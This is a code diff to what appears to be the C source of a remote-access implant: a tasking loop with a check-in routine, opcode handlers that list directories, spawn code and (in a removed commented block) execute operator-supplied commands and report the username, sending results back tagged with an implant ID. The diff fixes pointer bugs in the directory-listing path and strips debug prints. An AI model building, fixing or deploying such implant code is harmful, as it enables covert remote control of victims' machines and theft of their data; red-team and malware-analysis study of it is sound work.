@@ -301,24 +301,21 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 	return FALSE;
 }
 
-BOOL StdlibOperation(TaskRequest *tr, char* data, size_t *dataSize)
+BOOL StdlibOperation(TaskRequest *tr, char** data, size_t *dataSize)
 {
-	DEBUG_PRINTF("STD_LIB\n");
 	DEBUG_PRINTF("%s\n", tr->Args);
 	int stdlib_opcode = (int)tr->Args[0];
-    DEBUG_PRINTF("%d\n", stdlib_opcode);
-    memmove(tr->Args, tr->Args+1, strlen(tr->Args));
-    DEBUG_PRINTF("ARGS = %s\n", tr->Args);
-    DEBUG_PRINTF("made data. doing opcode\n");
+	DEBUG_PRINTF("%d\n", stdlib_opcode);
+	memmove(tr->Args, tr->Args+1, strlen(tr->Args));
+	DEBUG_PRINTF("ARGS = %s\n", tr->Args);
 
     switch (stdlib_opcode)
     {
 
     case 49:
-	    DEBUG_PRINTF("LIST DIRECTORY\n");
-        data = listdirs(tr->Args);
-	dataSize = strlen(data);
-        break;
+        *data = listdirs(tr->Args);
+	*dataSize = strlen(*data);	
+	break;
 
     case 2:
         //data = readfile(args);
@@ -348,8 +345,6 @@ BOOL StdlibOperation(TaskRequest *tr, char* data, size_t *dataSize)
         break;
 	return false;
     }
-    printf("RESULT: %s\n", data);
-    printf("calling back\n");
     return true;
 }
 
@@ -377,21 +372,24 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
             //Success = SpawnExecuteCode(Buffer);
             break;
 
-        case OPCODE_STDLIB:
+        case OPCODE_STDLIB: ;
             // stdlib command so lets run it
-            DEBUG_PRINTF("STDLIB TO DO\n");
-	    size_t *outputSize = 0;
+	    size_t outputSize = 0;
 	    char* output = malloc(4096);
 	    // Directory size can't be bigger than page. Womp womp.
-	    Success = StdlibOperation(tr, output, &outputSize);
+	    Success = StdlibOperation(tr, &output, &outputSize);
 	    if (Success) {
-		    DEBUG_PRINTF("WE GOT ER\n");
 		    tResp->TaskID = tr->TaskID;
 		    tResp->ImplantID = (char *) ImplantID;
-		    tResp->Response = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(output));
-		    memcpy(tResp->Response, output, outputSize);
+		    DEBUG_PRINTF("OUTPUT: %s\n", output);
+		    pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(outputSize));
+		    
+		    bytes_array->size = outputSize;
+		    memcpy(bytes_array->bytes, output, outputSize);
+		    tResp->Response = bytes_array;
+		    //DEBUG_PRINTF("bytes_array->size = %d\n", bytes_array->size);
+		    //DEBUG_PRINTF("bytes_array->bytes = %s\n", bytes_array->bytes);
 	    }
-	    DEBUG_PRINTF("RESPONSE = %s\n", (char *)output);
 	    free(output); 
             break;
 
@@ -412,79 +410,6 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
         }
 	
 	return 0;
-/**	
-	if (tr->Opcode == OPCODE_LS)
-	{
-	DEBUG_PRINTF("DOING LS\n");
-	size_t outputBufferSize = 0;
-
-	if tr->
-	LPBYTE outputBuffer = ListFiles(tr->Args, &outputBufferSize);
-			DEBUG_PRINTF("Execute ls.\n");
-			LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
-			DEBUG_PRINTF("Executed ls.\n");
-
-			// warning unsafe for any command that isn't a string
-			DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
-			pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
-			
-			if (!bytes_array) {
-				free(cmdOut);
-				return 1;
-			}
-			
-			bytes_array->size = stOut;
-			memcpy(bytes_array->bytes, cmdOut, stOut);
-			free(cmdOut);
-			tResp->TaskID = tr->TaskID;
-			tResp->Response = bytes_array;
-			return 0;
-	}
-	else if (tr->Opcode == OPCODE_EXEC)
-	{
-			size_t stOut = 0;
-			LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
-			// warning unsafe for any command that isn't a string
-			DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
-			pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
-			if (!bytes_array) {
-				free(cmdOut);
-				return 1;
-			}
-            
-            		bytes_array->size = stOut;
-            		memcpy(bytes_array->bytes, cmdOut, stOut);
-            		free(cmdOut);
-            
-            		tResp->TaskID = tr->TaskID;
-            		tResp->Response = bytes_array;
-            
-            		return 0;
-	} 
-	else if (tr->Opcode == OPCODE_WHOAMI)
-	{
-                	char username[MAX_PATH] = {0};
-                	DWORD dwSize = MAX_PATH;
-                
-                	GetUserNameA(username, &dwSize);
-                	dwSize--;
-                	pb_bytes_array_t *bytes_array =
-                	(pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
-			if (!bytes_array) {
-                    		return 1;
-                	}
-                
-                	DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
-                	bytes_array->size = (size_t)dwSize;
-                	memcpy(bytes_array->bytes, username, (size_t)dwSize);
-                	tResp->TaskID = tr->TaskID;
-                	tResp->Response = bytes_array;
-                	return 0;
-	}
-	else {
-            		DEBUG_PRINTF("INVALID Opcode\n");
-            		return 1;
-	}**/
 }
 
 int main() {
